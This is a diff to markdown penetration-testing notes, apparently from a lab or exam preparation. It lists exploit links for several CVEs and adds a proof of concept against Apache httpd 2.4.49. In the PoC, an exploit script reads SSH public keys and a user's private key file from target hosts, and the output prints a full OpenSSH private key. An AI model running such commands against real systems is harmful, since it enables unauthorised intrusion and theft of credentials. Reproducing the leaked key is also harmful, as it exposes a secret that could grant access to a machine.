@@ -253,6 +253,29 @@ https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
 ````
 CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
 ````
+##### Exploitation http versions
+````
+80/tcp   open  http     Apache httpd 2.4.49
+````
+![image](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)
+
+###### POC
+````
+./exploit.sh targets.txt /etc/ssh/*pub
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
+
+./exploit.sh targets.txt /home/anita/.ssh/id_ecdsa
+192.168.138.245:8000
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
+13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
+dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
+fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
+ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
+8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
+CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
+-----END OPENSSH PRIVATE KEY-----
+````
 ##### ? notes
 ##### /etc/hosts FQDN
 ###### Background
